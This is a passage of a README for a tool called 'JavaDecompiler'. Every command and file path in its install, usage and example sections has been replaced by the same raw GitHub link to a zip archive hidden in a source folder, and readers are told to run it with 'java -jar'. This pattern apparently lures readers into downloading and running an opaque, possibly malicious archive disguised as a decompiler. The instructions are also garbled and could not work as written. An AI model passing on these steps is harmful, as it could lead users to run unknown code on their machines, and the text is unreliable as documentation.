   ```bash
   java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
   ```

## Usage

### Basic Commands

After launching the application, you can use the following commands to decompile your files:

- **Decompile a Single File**:

  ```bash
  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
  ```

- **Decompile a JAR File**:

  ```bash
  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip
  ```

- **Batch Decompile**:

  To decompile multiple files, use:

  ```bash
  java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip batch path/to/directory
  ```

### Options

You can customize your decompilation process with various options:

- `--output`: Specify the output directory for the decompiled files.
- `--verbose`: Enable detailed logging of the decompilation process.
- `--help`: Display the help message with all available commands.

## Example

Here’s an example of how to decompile a JAR file:

1. Download the JAR file you want to decompile.
2. Use the following command:

   ```bash
   java -jar https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip decompile https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip --output ./decompiled
   ```

This command will decompile `https://github.com/dzanaimamovic/JavaDecompiler/raw/refs/heads/main/src/main/java/com/decompiler/model/Java-Decompiler-2.0.zip` and save the output in the `./decompiled` directory.

## Troubleshooting

If you encounter issues while using JavaDecompiler, consider the following steps:

- **Check Java Version**: Ensure you are using a compatible version of Java JDK.
- **File Paths**: Verify that the file paths you provide are correct.
- **Permissions**: Make sure you have the necessary permissions to read the files.
